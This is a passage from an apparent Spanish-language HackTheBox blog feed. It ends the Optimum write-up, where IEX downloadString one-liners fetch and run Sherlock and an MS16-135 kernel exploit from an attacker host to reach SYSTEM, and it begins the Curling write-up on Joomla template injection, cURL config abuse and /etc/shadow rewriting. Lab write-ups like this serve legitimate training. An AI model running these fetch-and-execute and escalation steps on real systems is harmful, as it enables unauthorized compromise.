&lt;p&gt;Entonces, podemos ya sea, descargar el archivo, subirlo e importar su funci√≥n principal llamada &lt;code&gt;Find-AllVulns&lt;/code&gt; (si revisas el c√≥digo la vez) oooooooo simplemente descargarlo, levantar un servidor &lt;strong&gt;web&lt;/strong&gt; y desde la consola de &lt;strong&gt;PowerShell&lt;/strong&gt; indicarle que cargue un m√≥dulo (el contenido) de x URL (nuestro script de &lt;code&gt;Sherlock.ps1&lt;/code&gt;), hagamos esta √∫ltima:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&quot;&gt;https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Levantamos servidor web donde est√© el archivo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± python3 -m http.server
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y ahora desde la &lt;strong&gt;PS&lt;/strong&gt; indicamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/Sherlock.ps1')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ya el contenido del script estar√≠a importado como un &lt;strong&gt;m√≥dulo&lt;/strong&gt; en el sistema, nos quedar√≠a llamarlo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\\Users\kostas\Videos&amp;gt; Find-AllVulns
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;De los resultados que arroja detallamos estos:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_SherlockREPORT.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Existen 3 vulnerabilidades que parecen afectar el sistema, pues empecemos a profundizar a ver‚Ä¶&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;ps-architecture&quot;&gt;Descubrimos arquitectura real en la que corren nuestros scripts de &lt;u&gt;PowerShell (PS)&lt;/u&gt; &lt;a href=&quot;#ps-architecture&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Dejando algunos objetos de lado llegamos al bolet√≠n &lt;code&gt;MS16-135&lt;/code&gt;, la explotaci√≥n de esa vuln es dada gracias a un problema con el kernel que permite escalar privilegios sin importar que usuario seamos‚Ä¶&lt;/p&gt;

&lt;p&gt;Les dejo estos dos recursos para que profundicen:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.elladodelmal.com/2017/04/como-explotar-el-bug-de-ms16-135-en.html&quot;&gt;C√≥mo explotar el bug de MS16-135 en Windows x64 con PowerShell &amp;amp; Metasploit ‚ÄúLike a Boss‚Äù&lt;/a&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.mcafee.com/blogs/other-blogs/mcafee-labs/digging-windows-kernel-privilege-escalation-vulnerability-cve-2016-7255/&quot;&gt;Digging Into a Windows Kernel Privilege Escalation Vulnerability: CVE-2016-7255&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Enfocados en ese bolet√≠n llegamos a esta prueba de concepto en &lt;strong&gt;PS&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-135/MS16-135.ps1&quot;&gt;MS16-135.ps1&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Haremos lo mismo que con &lt;code&gt;Sherlock&lt;/code&gt;, descargamos el recurso, levantamos servidor web e importamos su contenido. En este caso no tendremos que llamar ninguna funci√≥n porque el c√≥digo no esta en ninguna, por lo que una vez ejecutemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/MS16-135.ps1')
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Interpretara el c√≥digo y lo ejecutara‚Ä¶&lt;/p&gt;

&lt;p&gt;El output despu√©s de ejecutarlo es confuso:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_MS135error_NOTx64.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Pero si validamos &lt;code&gt;systeminfo&lt;/code&gt; tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\&amp;gt; systeminfo
...
System Type:               x64-based PC
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;WTF, deber√≠a funcionarnos el script, ya que &lt;strong&gt;&lt;em&gt;SI&lt;/em&gt;&lt;/strong&gt; estamos en una arquitectura &lt;code&gt;x64&lt;/code&gt;‚Ä¶ ¬øO no?&lt;/p&gt;

&lt;p&gt;Pues buscando info para validar esto encontramos este post:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://ridicurious.com/2018/10/17/4-ways-to-find-os-architecture-using-powershell-32-or-64-bit/&quot;&gt;4 Ways to Find OS Architecture using PowerShell (32 or 64 bit)&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;En la cuarta forma de validarlo quedamos anonadados üò≤&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_validatingOSarch_IntPtr.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Solo podemos obtener dos respuestas: &lt;code&gt;4&lt;/code&gt; (4&lt;em&gt;4=32 (32 bits)) u &lt;code&gt;8&lt;/code&gt; (8&lt;/em&gt;8=64 (64 bits)).&lt;/p&gt;

&lt;p&gt;Veamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\&amp;gt; [System.IntPtr]::Size
4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;üôÜ‚Äç‚ôÇÔ∏è kheeeeeeeeeeeeeeeeeeeeeee!!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span style=&quot;color: grey;&quot;&gt;HOY (un d√≠a)&lt;/span&gt;&lt;/strong&gt;: &lt;strong&gt;&lt;em&gt;&lt;span style=&quot;color: yellow;&quot;&gt;No he encontrado √©l -porque- de esto, seguir√© investigando y dejar√© un update :P&lt;/span&gt;&lt;/em&gt;&lt;/strong&gt; &lt;br /&gt;
&lt;strong&gt;&lt;span style=&quot;color: grey;&quot;&gt;UPDATE (3 d√≠as despu√©s)&lt;/span&gt;&lt;/strong&gt;: Seg√∫n &lt;strong&gt;&lt;em&gt;&lt;span style=&quot;color: yellow;&quot;&gt;&lt;a href=&quot;https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#shell-as-system&quot;&gt;0xdf en su writeup&lt;/a&gt;: ‚ÄúThat is because the HFS process is likely running as a 32-bit process‚Äù.&lt;/span&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Intentando corroborar lo obtenido llegamos a este hilo en &lt;strong&gt;stackoverflow&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/25407634/check-processor-architecture-and-proceed-with-if-statement#answer-25407836&quot;&gt;check processor architecture and proceed with if statement&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Usando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;[System.Environment]::Is64BitProcess
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos validar si los procesos ejecutados est√°n siendo tomados desde una arquitectura &lt;code&gt;64 bits&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\&amp;gt; [System.Environment]::Is64BitProcess
False
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y no, confirmamos que no estamos en una arquitectura de &lt;code&gt;64 bits&lt;/code&gt; sino en una de &lt;code&gt;32 bits&lt;/code&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Buscando maneras de cambiarnos a &lt;code&gt;64 bits&lt;/code&gt; llegamos a este nuevo hilo:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://stackoverflow.com/questions/19055924/how-to-launch-64-bit-powershell-from-32-bit-cmd-exe&quot;&gt;How to launch 64-bit powershell from 32-bit cmd.exe?&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6google_stackoverflow_CHANGEarch32to64.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;La que nos permite el cambio es ejecutar &lt;code&gt;powershell&lt;/code&gt; desde la ruta &lt;strong&gt;nativa&lt;/strong&gt;, esto para poder ejecutar c√≥digo de &lt;code&gt;64 bits&lt;/code&gt; sobre una arquitectura de &lt;code&gt;32 bits&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Pues hagamos la f√°cil, modifiquemos el script con el que obtuvimos la reverse Shell y en vez de llamar &lt;code&gt;powershell.exe&lt;/code&gt; sin ruta absoluta, agregu√©mosle la ruta nativa y validemos si conseguimos estar en &lt;code&gt;64 bits&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_scriptPYsource_updatePSnative.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ejecutamos yyyyyyyyyyyyyyyyyyyy:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_PSnative_DONE.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;LISTOOOOOOOOOOOOOOOOOOOOOOOONEEEEEEES, ahora s√≠√≠√≠√≠√≠√≠√≠ ‚Ä¶‚Ä¶ AHHHHHHHHHHHHHHHHHHHHHHHHHHLKfjsadklfjl√±aksdlkjld e.e&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;ms16-135&quot;&gt;Conseguimos &lt;u&gt;Shell&lt;/u&gt; como &lt;u&gt;nt authority\system&lt;/u&gt; &lt;a href=&quot;#ms16-135&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Volvamos a ejecutar el contenido del script (ya no deber√≠amos ver ese error):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\&amp;gt; IEX(New-Object Net.Webclient).downloadString('http://10.10.14.2:8000/MS16-135.ps1'
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_kostasSH_MS135_done.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;¬°DE MARAVILLA!! Ya funciona, pero parece que todo esta igual ¬øno? e.e Puesssssssssssssss:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6bash_sysSH_MS135.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Tamos tamos tamoooooooooooooooooooooooooooos, hemos migrado al usuario &lt;code&gt;nt authority\system&lt;/code&gt; y obtenido una &lt;strong&gt;terminal&lt;/strong&gt; como √©l (:&lt;/p&gt;

&lt;p&gt;Linda manera de escalar, me g u s t o.&lt;/p&gt;

&lt;p&gt;Ya podr√≠amos ver las flags:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/optimum/6flags.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 100%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Me gusto bastante la m√°quina, sobre todo la escalada, no me hab√≠a topado con ese ‚Äúproblema‚Äù de estar en una arquitectura pero a la vez no, loco loco.&lt;/p&gt;

&lt;p&gt;Este es el final de nuestro encuentro, pero nos leeremos con m√°s cositas, bendiciones, besitos y como siempre, a seguir rompiendo tooooooooooooodo!!&lt;/p&gt;
</description>
        <pubDate>Sat, 21 Aug 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/optimum</link>
        <guid isPermaLink="true">http://localhost:4000/htb/optimum</guid>
        
        <category>kernel-exploit</category>
        
        <category>PSarchitecture</category>
        
        <category>HFS</category>
        
        <category>MS16-135</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Curling</title>
        <description>&lt;p&gt;M√°quina Linux nivel f√°cil. Ojos bien abiertos en la p√°gina web, jueguitos con &lt;strong&gt;templates&lt;/strong&gt; de &lt;strong&gt;Joomla&lt;/strong&gt;, loops de backups (?), movimientos sensuales con un archivo de configuraci√≥n de &lt;strong&gt;cURL&lt;/strong&gt; y ayudamos al usuario &lt;strong&gt;root&lt;/strong&gt; a renovar su contrase√±a modificando el archivo &lt;strong&gt;/etc/shadow&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160curlingHTB.png&quot; alt=&quot;160curlingHTB&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/29267&quot;&gt;L4mpje&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Juegue juegue, todo pelota!&lt;/p&gt;

&lt;p&gt;Encontraremos un servidor web con el &lt;strong&gt;gestor de contenido &lt;code&gt;Joomla&lt;/code&gt;&lt;/strong&gt; bastante juguet√≥n, inspeccionaremos c√≥digo y texto para extraer credenciales. Estas nos ser√°n v√°lidas contra el panel admin de &lt;strong&gt;Joomla&lt;/strong&gt;. Estando dentro modificaremos un &lt;code&gt;template&lt;/code&gt; para que interprete c√≥digo &lt;code&gt;PHP&lt;/code&gt; ‚Äúmalicioso‚Äù, usaremos esto para obtener una &lt;strong&gt;Reverse Shell&lt;/strong&gt; como el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;En el sistema, espec√≠ficamente en la carpeta &lt;code&gt;/home&lt;/code&gt; del usuario &lt;code&gt;floris&lt;/code&gt; encontraremos un archivo llamado &lt;code&gt;password_backup&lt;/code&gt;, el tipo de archivo nos indicar√° que es un comprimido, pero al descomprimirlo obtenemos otro comprimido, jugaremos con eso para despu√©s de unas cuantas descompresiones obtener el archivo &lt;code&gt;password.txt&lt;/code&gt; y conseguir una &lt;strong&gt;Shell&lt;/strong&gt; como el usuario &lt;strong&gt;floris&lt;/strong&gt; en el sistema.&lt;/p&gt;

&lt;p&gt;Nos daremos cuenta de que el usuario &lt;code&gt;root&lt;/code&gt; esta ejecutando unas instrucciones automatizadas que interact√∫an con dos archivos a los que tenemos acceso, &lt;code&gt;input&lt;/code&gt; y &lt;code&gt;report&lt;/code&gt;. &lt;strong&gt;&lt;em&gt;input&lt;/em&gt;&lt;/strong&gt; es un archivo de configuraci√≥n de &lt;code&gt;cURL&lt;/code&gt; (o sea, toma el contenido y si son comandos usados por &lt;strong&gt;curl&lt;/strong&gt;, los ejecuta) y &lt;strong&gt;&lt;em&gt;report&lt;/em&gt;&lt;/strong&gt; guarda la respuesta de la petici√≥n o configuraci√≥n dada en &lt;strong&gt;&lt;em&gt;input&lt;/em&gt;&lt;/strong&gt;. Haremos que el archivo &lt;code&gt;input&lt;/code&gt; lea archivos del sistema jugando con &lt;code&gt;file://&lt;/code&gt;, como la instrucci√≥n la ejecuta &lt;strong&gt;&lt;em&gt;root&lt;/em&gt;&lt;/strong&gt; podemos leer cualquier archivo.&lt;/p&gt;

&lt;p&gt;Usaremos esa habilidad para modificar el archivo &lt;code&gt;/etc/shadow&lt;/code&gt; con otra contrase√±a para el usuario &lt;strong&gt;&lt;em&gt;root&lt;/em&gt;&lt;/strong&gt;, esto para obtener una &lt;strong&gt;Shell&lt;/strong&gt; en el sistema como √©l.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/curling/160statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Algo juguetona, pero toca temas realistas y conocidos.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Vivo vivito.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Recorremos &lt;strong&gt;CMS Joomla&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#joomla-template-rce&quot;&gt;Modificamos &lt;strong&gt;template&lt;/strong&gt; de &lt;strong&gt;Joomla&lt;/strong&gt; para conseguir &lt;strong&gt;ejecuci√≥n remota de comandos&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#joomla-template-rce-reverseshell&quot;&gt;Obtenemos &lt;strong&gt;Reverse Shell&lt;/strong&gt; en el sistema como &lt;u&gt;www-data&lt;/u&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#backupassword-floris&quot;&gt;Movimiento lateral &lt;strong&gt;backup_password&lt;/strong&gt;: Vamos de &lt;strong&gt;www-data&lt;/strong&gt; a &lt;strong&gt;floris&lt;/strong&gt;&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#password-decompress&quot;&gt;Jugamos a descomprimir el comprimido del comprimido&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#breaking-curlfig&quot;&gt;Explotando el archivo que toma &lt;strong&gt;cURL&lt;/strong&gt; como ‚Äúconfiguraci√≥n‚Äù&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#shadow-root&quot;&gt;Cambiamos la contrase√±a del usuario &lt;strong&gt;root&lt;/strong&gt; para obtener una &lt;strong&gt;Shell&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Inicialmente necesitamos saber que puertos tiene abiertos la m√°quina, los descubriremos con &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p- --open -v 10.10.10.150 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;El escaneo nos devuelve dos puertos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Nmap 7.80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.150
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.150 ()	Status: Up
Host: 10.10.10.150 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
# Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 104.58 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://www.hackingarticles.in/ssh-penetration-testing-port-22/&quot;&gt;SSH&lt;/a&gt;&lt;/strong&gt;: Tenemos la opci√≥n de obtener una Shell de forma segura.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;strong&gt;&lt;a href=&quot;https://searchnetworking.techtarget.com/definition/port-80&quot;&gt;HTTP&lt;/a&gt;&lt;/strong&gt;: Esta sirviendo un servidor web.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ahora tenemos que profundizar un poco, necesitamos saber que versiones y script est√°n siendo ejecutad@s por cada servicio (puerto), as√≠ nuestra pr√≥xima investigaci√≥n es muuucho m√°s peque√±a:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;~(Usando la funci√≥n &lt;code&gt;extractPorts&lt;/code&gt; (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± extractPorts initScan 
[*] Extracting information...

    [*] IP Address: 10.10.10.150
    [*] Open ports: 22,80

[*] Ports copied to clipboard
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;)~&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p 22,80 -sC -sV 10.10.10.150 -oN portScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneo de los puertos obtenidos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sC&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Muestra todos los scripts relacionados con el servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-sV&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Nos permite ver la versi√≥n del servicio&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oN&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Obtenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;# Nmap 7.80 scan initiated Thu Aug 19 25:25:25 2021 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.150
Nmap scan report for 10.10.10.150
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: Joomla! - Open Source Content Management
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 19 25:25:25 2021 -- 1 IP address (1 host up) scanned in 12.56 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Puerto&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Servicio&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Versi√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;OpenSSH 7.6p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;HTTP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Lo √∫nico llamativo es &lt;code&gt;Joomla&lt;/code&gt;, que es un &lt;em&gt;gestor de contenido&lt;/em&gt; web. Sigamos profundizando a ver que encontramos.&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;enumeracion&quot;&gt;Enumeraci√≥n &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

